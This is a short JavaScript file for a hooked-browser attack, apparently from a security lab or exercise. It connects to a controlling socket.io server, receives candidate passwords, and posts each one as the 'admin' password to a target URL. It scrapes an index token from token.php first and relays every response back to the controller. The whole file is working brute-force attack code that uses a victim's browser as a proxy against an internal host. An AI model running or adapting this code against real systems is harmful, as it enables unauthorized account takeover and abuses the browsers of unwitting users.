const serverURL = window.location.hostname + ":" + window.location.port;

let token = '';
let victimURL = 'http://blind_hacker/';
// let victimURL = 'http://localhost:3001/';

window.onload = function () {

    const socket = io.connect(serverURL);
    // register hooked browser connection
    socket.emit('browser-connect');

    socket.on('mensaje', function (passwd) {

        // let passwd = data.split('&')[1].split('=')[1]

        // Build formData object.
        let formData = new FormData();
        formData.append('username', "admin");
        formData.append('password', passwd);

        fetch(victimURL + '?indextoken=' + token, {
            method: 'POST',
            body: formData
        }).then(res => res.text()).then(data => {
            socket.emit('answer', {data: data, passwd: passwd});
            // console.log("Answer from ikasten:" + data);
        })
        // console.log("recibido:" + JSON.stringify(passwd));
    })


    fetch(victimURL + "token.php").then(res => res.text()).then(data => {
        token = data.split(" ")[4];
    })

};
